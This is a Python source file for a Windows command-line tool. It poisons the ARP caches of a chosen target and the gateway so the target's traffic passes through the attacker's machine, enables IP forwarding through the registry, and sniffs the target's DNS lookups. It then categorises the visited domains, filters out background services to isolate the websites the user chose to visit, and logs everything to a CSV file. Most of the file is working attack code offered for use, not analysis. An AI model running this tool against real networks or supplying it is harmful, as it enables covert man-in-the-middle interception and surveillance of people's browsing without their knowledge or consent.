from scapy.all import *
from scapy.arch.windows import get_windows_if_list
import argparse
import datetime
import sys
import os
import threading
import time

# Colors for terminal output
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'

class ARPSpoofer:
    def __init__(self, interface, target_ip, gateway_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.running = False
        
        try:
            # Get MAC addresses
            self.target_mac = self.get_mac(target_ip)
            self.gateway_mac = self.get_mac(gateway_ip)
            
            # Try to get local MAC, fall back to a different method if it fails
            try:
                self.spoofer_mac = get_if_hwaddr(interface)
            except:
                # Alternative way to get MAC on Windows
                from scapy.arch.windows import NetworkInterface
                iface_obj = NetworkInterface(interface)
                self.spoofer_mac = iface_obj.mac
            
            if not self.target_mac or not self.gateway_mac:
                print(f"{Colors.RED}[!] Failed to get MAC addresses. Check IP addresses and make sure the target is online.{Colors.ENDC}")
                sys.exit(1)
                
            print(f"{Colors.BLUE}[*] Target MAC: {self.target_mac}{Colors.ENDC}")
            print(f"{Colors.BLUE}[*] Gateway MAC: {self.gateway_mac}{Colors.ENDC}")
            print(f"{Colors.BLUE}[*] Your MAC: {self.spoofer_mac}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error initializing ARP spoofer: {e}{Colors.ENDC}")
            sys.exit(1)
    
    def get_mac(self, ip):
        """Get the MAC address of an IP using ARP requests"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast/arp_request
            answered = srp(packet, timeout=2, verbose=False, iface=self.interface)[0]
            return answered[0][1].hwsrc
        except IndexError:
            print(f"{Colors.RED}[!] Could not get MAC address for {ip}. Make sure it's online.{Colors.ENDC}")
            return None
        except Exception as e:
            print(f"{Colors.RED}[!] Error getting MAC address: {e}{Colors.ENDC}")
            return None
    
    def spoof(self):
        """Send ARP packets to spoof target and gateway"""
        try:
            # Tell target that we are the gateway (with proper Ethernet frame)
            target_ether = Ether(dst=self.target_mac, src=self.spoofer_mac)
            target_arp = ARP(
                op=2,  # is-at (response)
                pdst=self.target_ip,
                hwdst=self.target_mac, 
                psrc=self.gateway_ip,
                hwsrc=self.spoofer_mac
            )
            target_packet = target_ether / target_arp
            
            # Tell gateway that we are the target (with proper Ethernet frame)
            gateway_ether = Ether(dst=self.gateway_mac, src=self.spoofer_mac)
            gateway_arp = ARP(
                op=2,  # is-at (response)
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.target_ip,
                hwsrc=self.spoofer_mac
            )
            gateway_packet = gateway_ether / gateway_arp
            
            # Send packets at layer 2 (including Ethernet headers)
            sendp(target_packet, verbose=False, iface=self.interface)
            sendp(gateway_packet, verbose=False, iface=self.interface)
        except Exception as e:
            print(f"{Colors.RED}[!] Error during ARP spoofing: {e}{Colors.ENDC}")
    
    def restore(self):
        """Restore normal ARP tables"""
        try:
            # Send correct ARP info to fix tables (with proper Ethernet frame)
            target_ether = Ether(dst=self.target_mac, src=self.gateway_mac)
            target_arp = ARP(
                op=2,
                pdst=self.target_ip,
                hwdst=self.target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac
            )
            target_packet = target_ether / target_arp
            
            gateway_ether = Ether(dst=self.gateway_mac, src=self.target_mac)
            gateway_arp = ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.target_ip,
                hwsrc=self.target_mac
            )
            gateway_packet = gateway_ether / gateway_arp
            
            # Send multiple times to make sure it's fixed
            for _ in range(5):
                sendp(target_packet, verbose=False, iface=self.interface)
                sendp(gateway_packet, verbose=False, iface=self.interface)
                time.sleep(0.2)
                
            print(f"{Colors.GREEN}[*] ARP tables restored to normal{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error restoring ARP tables: {e}{Colors.ENDC}")
    
    def start_spoofing(self):
        """Start ARP spoofing in a loop"""
        self.running = True
        print(f"{Colors.GREEN}[*] Starting ARP spoofing attack...{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Redirecting traffic from {self.target_ip} through this machine{Colors.ENDC}")
        
        # Enable IP forwarding on Windows
        os.system("reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
        print(f"{Colors.YELLOW}[*] Enabled IP forwarding (requires Windows restart to take full effect){Colors.ENDC}")
        
        try:
            while self.running:
                self.spoof()
                time.sleep(1)  # Send every 1 second (increased frequency from 2s)
        except KeyboardInterrupt:
            pass
        finally:
            print(f"{Colors.YELLOW}[*] Stopping ARP spoofing...{Colors.ENDC}")
            self.restore()
            # Disable IP forwarding
            os.system("reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f")

def categorize_domain(domain):
    """Categorize a domain based on keywords and patterns"""
    # Domain category patterns
    categories = {
        "Social Media": ["facebook", "twitter", "instagram", "linkedin", "reddit", "pinterest", "snapchat", "discord", "telegram", "whatsapp"],
        "Streaming": ["netflix", "youtube", "hulu", "disney", "spotify", "twitch", "prime", "video", "stream", "music", "vimeo", "soundcloud", "pandora"],
        "Shopping": ["amazon", "ebay", "walmart", "shop", "store", "etsy", "aliexpress", "target", "bestbuy", "newegg", "wayfair", "zalando"],
        "News": ["news", "cnn", "bbc", "nytimes", "reuters", "guardian", "huffpost", "fox", "msnbc", "abc", "wsj", "economist"],
        "Tech": ["github", "stack", "gitlab", "microsoft", "apple", "google", "android", "windows", "linux", "dev", "api", "cloud", "azure", "aws"],
        "Gaming": ["game", "steam", "epic", "roblox", "blizzard", "xbox", "playstation", "nintendo", "ea", "ubisoft", "activision", "riot"],
        "Education": ["edu", "school", "learn", "course", "university", "college", "academia", "khan", "udemy", "coursera", "edx"],
        "Finance": ["bank", "finance", "pay", "money", "invest", "trading", "crypto", "stock", "capital", "visa", "mastercard", "paypal", "venmo"],
        "Advertising": ["ad", "ads", "advert", "analytics", "track", "marketing", "pixel", "metrics", "doubleclick"],
        "Content Delivery": ["cdn", "cloudfront", "fastly", "akamai", "cloudflare", "cache", "edgecast", "jsdelivr"],
        "Email": ["mail", "smtp", "imap", "outlook", "gmail", "proton", "yahoo", "hotmail", "exchange"],
        "Search": ["search", "query", "find", "google", "bing", "yahoo", "duckduckgo", "baidu"],
        "Productivity": ["office", "docs", "sheets", "slides", "notion", "evernote", "trello", "asana", "monday", "slack", "teams"],
        "Security": ["security", "auth", "login", "vpn", "antivirus", "proxy", "firewall", "encrypt"],
        "Communication": ["chat", "call", "zoom", "meet", "skype", "webex", "conference", "messenger"]
    }
    
    domain_lower = domain.lower()
    
    # Check each category
    for category, keywords in categories.items():
        for keyword in keywords:
            if keyword in domain_lower:
                return category
    
    # Check TLDs for some basic categorization
    parts = domain_lower.split('.')
    if len(parts) > 1:
        tld = parts[-1]
        if tld == "edu":
            return "Education"
        elif tld == "gov":
            return "Government"
        elif tld in ["io", "dev", "tech"]:
            return "Tech"
    
    return "Other"

def is_user_website(domain):
    """
    Determine if a domain is likely user-initiated website vs background services
    Returns True if it's likely a user-visited website
    """
    # Common background service patterns to filter out
    background_patterns = [
        'push-notifications', 'analytics', 'metrics', 'telemetry', 'cdn.',
        'api.', 'update.', 'stun.', 'time.', 'ntp.', 'diagnostics',
        'windowsupdate', 'stats.', 'tracking.', 'captive-portal',
        'connectivity-check', 'ocsp.', 'safebrowsing'
    ]
    
    # Common Windows/service domains to filter out
    common_services = [
        'microsoft.com', 'windows.com', 'msftconnecttest.com', 'akadns.net',
        'digicert.com', 'office.com', 'gstatic.com', 'googleapis.com',
        'msedge.net', 'akamai', 'akamaiedge.net', 'edgekey.net', 
        'cloudflare.com', 'in-addr.arpa', 'local', 'akamaitechnologies.com',
        'edgesuite.net', 'skype.com', 'azureedge.net', 'msauth.net'
    ]
    
    # Check for IP address lookups (PTR records)
    if domain.endswith('.in-addr.arpa') or domain.endswith('.ip6.arpa'):
        return False
        
    # Check if domain matches any background pattern
    for pattern in background_patterns:
        if pattern in domain.lower():
            return False
           
    # Check if domain is a common service domain 
    for service in common_services:
        if domain.lower().endswith(service):
            return False
    
    # Additional heuristics to identify background traffic
    parts = domain.split('.')
    
    # If it's a subdomain with more than 4 parts, likely a service not a website
    if len(parts) > 4:
        # Unless it's a known website pattern
        if not any(site in domain.lower() for site in ['google', 'facebook', 'amazon', 'apple', 'youtube']):
            return False
            
    return True

class DNSSniffer:
    def __init__(self, interface=None, output_file=None, target_ip=None, websites_only=False, categorize=False):
        self.interface = interface
        self.output_file = output_file
        self.target_ip = target_ip
        self.websites_only = websites_only
        self.categorize = categorize
        self.log_file = None
        self.should_stop = False
        self.domain_timestamps = {}  # Track when domains were last seen
        self.category_stats = {}  # Track statistics for categories
        
        if output_file:
            try:
                self.log_file = open(output_file, 'w')
                self.log_file.write("Timestamp,Source IP,Destination IP,Query Type,Category,Domain,Response\n")
            except Exception as e:
                print(f"{Colors.RED}[!] Error opening output file: {e}{Colors.ENDC}")
                sys.exit(1)
        
        print(f"{Colors.GREEN}[*] {'Showing only user websites' if websites_only else 'Showing all DNS traffic'}{Colors.ENDC}")
        if categorize:
            print(f"{Colors.GREEN}[*] Categorizing DNS traffic by domain type{Colors.ENDC}")
    
    def process_packet(self, packet):
        try:
            # Check if packet has DNS layer
            if packet.haslayer(DNS):
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                src_ip = packet[IP].src if packet.haslayer(IP) else "N/A"
                dst_ip = packet[IP].dst if packet.haslayer(IP) else "N/A"
                
                # If target IP is specified, only show packets from/to target
                if self.target_ip and (src_ip != self.target_ip and dst_ip != self.target_ip):
                    return
                
                # DNS Query
                if packet.haslayer(DNSQR):
                    qname = packet[DNSQR].qname.decode('utf-8').rstrip('.')
                    qtype = self._get_query_type(packet[DNSQR].qtype)
                    
                    # Get domain category
                    category = categorize_domain(qname)
                    
                    # Update category statistics
                    self.category_stats[category] = self.category_stats.get(category, 0) + 1
                    
                    # Filter out non-website DNS queries if websites_only is enabled
                    if self.websites_only and not is_user_website(qname):
                        return
                    
                    # Check if domain was recently seen (allow resetting after 30 seconds)
                    current_time = time.time()
                    domain_key = f"{src_ip}_{qname}_{qtype}"
                    if domain_key in self.domain_timestamps and current_time - self.domain_timestamps[domain_key] < 30:
                        return
                    self.domain_timestamps[domain_key] = current_time
                    
                    # Get color for category
                    category_color = self._get_category_color(category)
                    
                    if self.target_ip and src_ip == self.target_ip:
                        if self.categorize:
                            output = f"{Colors.GREEN}{timestamp} | DNS Query | {src_ip} → {dst_ip} | Type: {qtype} | {category_color}Category: {category}{Colors.ENDC} | Domain: {qname}{Colors.ENDC}"
                        else:
                            output = f"{Colors.GREEN}{timestamp} | DNS Query | {src_ip} → {dst_ip} | Type: {qtype} | Domain: {qname}{Colors.ENDC}"
                    else:
                        if self.categorize:
                            output = f"{timestamp} | DNS Query | {src_ip} → {dst_ip} | Type: {qtype} | {category_color}Category: {category}{Colors.ENDC} | Domain: {qname}"
                        else:
                            output = f"{timestamp} | DNS Query | {src_ip} → {dst_ip} | Type: {qtype} | Domain: {qname}"
                    print(output)
                    
                    if self.log_file:
                        self.log_file.write(f"{timestamp},{src_ip},{dst_ip},{qtype},{category},{qname},''\n")
                
                # DNS Response
                if packet.haslayer(DNSRR):
                    qname = packet[DNSQR].qname.decode('utf-8').rstrip('.') if packet.haslayer(DNSQR) else "N/A"
                    
                    # Get domain category
                    category = categorize_domain(qname)
                    
                    # Skip responses for filtered domains
                    if self.websites_only and not is_user_website(qname):
                        return
                    
                    answers = []
                    
                    for i in range(packet[DNS].ancount):
                        rr = packet[DNSRR][i]
                        rdata = rr.rdata
                        if isinstance(rdata, bytes):
                            try:
                                rdata = rdata.decode('utf-8')
                            except:
                                rdata = str(rdata)
                        
                        answers.append(f"{rdata}")
                    
                    answer_str = ', '.join(answers)
                    
                    # Check if response was recently seen
                    current_time = time.time()
                    domain_key = f"{dst_ip}_{qname}_response"
                    if domain_key in self.domain_timestamps and current_time - self.domain_timestamps[domain_key] < 30:
                        return
                    self.domain_timestamps[domain_key] = current_time
                    
                    # Get color for category
                    category_color = self._get_category_color(category)
                    
                    if self.target_ip and dst_ip == self.target_ip:
                        if self.categorize:
                            output = f"{Colors.BLUE}{timestamp} | DNS Response | {src_ip} → {dst_ip} | {category_color}Category: {category}{Colors.ENDC} | Domain: {qname} | Answers: {answer_str}{Colors.ENDC}"
                        else:
                            output = f"{Colors.BLUE}{timestamp} | DNS Response | {src_ip} → {dst_ip} | Domain: {qname} | Answers: {answer_str}{Colors.ENDC}"
                    else:
                        if self.categorize:
                            output = f"{timestamp} | DNS Response | {src_ip} → {dst_ip} | {category_color}Category: {category}{Colors.ENDC} | Domain: {qname} | Answers: {answer_str}" 
                        else:
                            output = f"{timestamp} | DNS Response | {src_ip} → {dst_ip} | Domain: {qname} | Answers: {answer_str}"
                    print(output)
                    
                    if self.log_file:
                        self.log_file.write(f"{timestamp},{src_ip},{dst_ip},'Response',{category},{qname},{answer_str}\n")
        except Exception as e:
            # Silent error handling for packet processing
            pass
    
    def _get_query_type(self, qtype):
        types = {
            1: "A",
            2: "NS",
            5: "CNAME",
            6: "SOA",
            12: "PTR",
            15: "MX",
            16: "TXT",
            28: "AAAA",
        }
        return types.get(qtype, str(qtype))
    
    def _get_category_color(self, category):
        """Return color code based on category for display"""
        category_colors = {
            "Social Media": Colors.PURPLE,
            "Streaming": Colors.BLUE,
            "Shopping": Colors.GREEN,
            "News": Colors.YELLOW,
            "Tech": Colors.BLUE,
            "Gaming": Colors.PURPLE,
            "Education": Colors.GREEN,
            "Finance": Colors.GREEN,
            "Advertising": Colors.RED,
            "Content Delivery": Colors.BLUE,
            "Email": Colors.YELLOW,
            "Search": Colors.PURPLE,
            "Productivity": Colors.BLUE,
            "Security": Colors.RED,
            "Communication": Colors.YELLOW,
            "Government": Colors.RED,
            "Other": Colors.ENDC
        }
        return category_colors.get(category, Colors.ENDC)
    
    def print_category_stats(self):
        """Print statistics about categories seen during session"""
        if not self.category_stats:
            return
            
        print(f"\n{Colors.GREEN}[*] Domain Category Statistics:{Colors.ENDC}")
        total = sum(self.category_stats.values())
        
        # Print header
        print(f"\nCategory                  | Count | % of Total")
        print("-" * 55)
        
        # Print each category with percentage
        for category, count in sorted(self.category_stats.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / total) * 100
            category_color = self._get_category_color(category)
            print(f"{category_color}{category:<25}{Colors.ENDC} | {count:5} | {percentage:6.2f}%")
        
        print("-" * 55)
        print(f"Total: {total} DNS queries\n")
    
    def sniff_packets(self):
        """Function to handle the sniffing in a separate thread with error handling"""
        while not self.should_stop:
            try:
                sniff(
                    iface=self.interface,
                    filter="udp port 53",  # Standard DNS port
                    prn=self.process_packet,
                    store=0,  # Don't store packets in memory
                    timeout=3  # Add timeout to check for stop flag periodically
                )
            except Exception as e:
                print(f"{Colors.YELLOW}[*] Sniffing interrupted: {e}. Restarting...{Colors.ENDC}")
                time.sleep(1)  # Wait before retrying
                continue
    
    def start_sniffing(self):
        if self.target_ip:
            print(f"{Colors.GREEN}[*] Starting DNS Sniffer{' on interface ' + self.interface if self.interface else ''}{Colors.ENDC}")
            print(f"{Colors.YELLOW}[*] Monitoring DNS traffic for target IP: {self.target_ip}{Colors.ENDC}")
        else:
            print(f"{Colors.GREEN}[*] Starting DNS Sniffer{' on interface ' + self.interface if self.interface else ''}{Colors.ENDC}")
        
        print(f"{Colors.YELLOW}[*] Press CTRL+C to stop{Colors.ENDC}")
        
        # Start sniffing in a dedicated thread
        sniff_thread = threading.Thread(target=self.sniff_packets)
        sniff_thread.daemon = True
        sniff_thread.start()
        
        try:
            # Keep the main thread running
            while True:
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Stopping DNS sniffer...{Colors.ENDC}")
            self.should_stop = True
            time.sleep(1)  # Give time for the sniffing thread to stop
            
            # Print category statistics
            if self.categorize:
                self.print_category_stats()
        finally:
            if self.log_file:
                self.log_file.close()
                print(f"{Colors.GREEN}[*] Results saved to {self.output_file}{Colors.ENDC}")

def list_interfaces():
    print("Available network interfaces:")
    try:
        interfaces = get_windows_if_list()
        for i, iface in enumerate(interfaces):
            print(f"{i+1}. {iface['name']} ({iface['description']})")
        return interfaces
    except Exception as e:
        print(f"{Colors.RED}[!] Error listing interfaces: {e}{Colors.ENDC}")
        sys.exit(1)

def main():
    # Suppress Scapy warnings
    conf.verb = 0  # Disable verbose warnings
    
    print(f"{Colors.GREEN}DNS Sniffer - Capture and analyze DNS traffic{Colors.ENDC}")
    
    if os.name != 'nt':
        print(f"{Colors.RED}[!] This script is designed for Windows systems only.{Colors.ENDC}")
        sys.exit(1)
    
    parser = argparse.ArgumentParser(description="DNS Sniffer with ARP Spoofing")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-o", "--output", help="Output file for DNS logs (CSV format)")
    parser.add_argument("-l", "--list", action="store_true", help="List available network interfaces")
    parser.add_argument("-t", "--target", help="Target IP address to monitor (requires ARP spoofing)")
    parser.add_argument("-g", "--gateway", help="Gateway IP address (required for ARP spoofing)")
    parser.add_argument("-p", "--promiscuous", action="store_true", help="Use promiscuous mode (may capture more packets)")
    parser.add_argument("-w", "--websites-only", action="store_true", help="Show only user websites, filter out background processes")
    parser.add_argument("-c", "--categorize", action="store_true", help="Show domain categories for all DNS traffic")
    args = parser.parse_args()
    
    if args.list:
        list_interfaces()
        sys.exit(0)
    
    # Determine interface
    interface = args.interface
    if not interface:
        interfaces = list_interfaces()
        try:
            choice = int(input("\nSelect interface number: "))
            if 1 <= choice <= len(interfaces):
                interface = interfaces[choice-1]['name']
            else:
                print(f"{Colors.RED}[!] Invalid selection. Exiting.{Colors.ENDC}")
                sys.exit(1)
        except ValueError:
            print(f"{Colors.RED}[!] Invalid input. Exiting.{Colors.ENDC}")
            sys.exit(1)
    
    # Set promiscuous mode if requested
    if args.promiscuous:
        print(f"{Colors.YELLOW}[*] Enabling promiscuous mode on {interface}{Colors.ENDC}")
        try:
            # Enable promiscuous mode using Windows commands
            os.system(f'netsh interface set interface "{interface}" admin=enabled')
        except:
            print(f"{Colors.YELLOW}[*] Failed to set promiscuous mode. Continuing anyway.{Colors.ENDC}")
    
    # Set up ARP spoofing if target is specified
    spoofer = None
    spoofer_thread = None
    if args.target:
        if not args.gateway:
            gateway = input("Enter gateway IP address: ")
        else:
            gateway = args.gateway
        
        # Create ARP spoofer
        spoofer = ARPSpoofer(interface, args.target, gateway)
        spoofer_thread = threading.Thread(target=spoofer.start_spoofing)
        spoofer_thread.daemon = True
        spoofer_thread.start()
        
        # Give ARP spoofing time to start
        print(f"{Colors.YELLOW}[*] Setting up ARP spoofing, please wait...{Colors.ENDC}")
        time.sleep(5)
    
    # Start DNS sniffer
    sniffer = DNSSniffer(
        interface=interface, 
        output_file=args.output, 
        target_ip=args.target, 
        websites_only=args.websites_only,
        categorize=args.categorize
    )
    
    try:
        sniffer.start_sniffing()
    except KeyboardInterrupt:
        print(f"{Colors.YELLOW}[*] User interrupted. Cleaning up...{Colors.ENDC}")
    finally:
        # Clean up if we were spoofing
        if spoofer:
            spoofer.running = False
            if spoofer_thread:
                spoofer_thread.join(timeout=2)

if __name__ == "__main__":
    main()